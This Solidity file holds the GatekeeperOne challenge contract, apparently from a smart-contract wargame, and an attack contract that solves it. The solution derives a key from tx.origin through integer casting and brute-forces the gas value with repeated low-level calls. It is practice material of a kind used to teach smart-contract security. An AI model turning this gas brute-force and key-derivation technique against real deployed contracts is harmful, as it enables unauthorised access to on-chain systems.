// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}


contract GatekeeperOneAttack {
    function attack(address gatekeeper) public {
        // Step 1: Derive key based on tx.origin (your address)
        uint16 originLow = uint16(uint160(tx.origin)); // last 2 bytes of origin
        uint64 key = uint64(originLow);                // lower 16 bits

        // Ensure uint32(key) != key
        // So pad the upper bits with non-zero
        key |= uint64(1) << 63; // make it a 64-bit number that fails full match

        bytes8 gateKey = bytes8(key);

        // Step 2: Brute-force gas
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = gatekeeper.call{gas: i + 8191 * 3}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                break;
            }
        }
    }
}
